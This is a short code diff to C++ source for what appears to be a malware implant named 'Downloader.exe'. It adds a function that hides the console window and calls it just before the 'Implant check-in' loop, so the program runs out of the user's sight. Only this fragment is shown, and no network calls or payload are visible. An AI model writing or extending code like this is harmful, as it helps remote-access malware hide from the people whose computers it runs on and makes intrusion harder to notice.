@@ -49,6 +49,11 @@ string randomId(size_t length);
 
 const string fileName = "Downloader.exe";
 
+void HideConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
+
 std::string stream_as_string( std::istream& stm )
 	 return { std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{} } ;
 
@@ -338,6 +343,8 @@ int main(int argc, char **argv) try {
 	/***
 	* Implant check-in
 	***/
+
+	HideConsole(); //Hides console UI
 
 	while (true) {
 
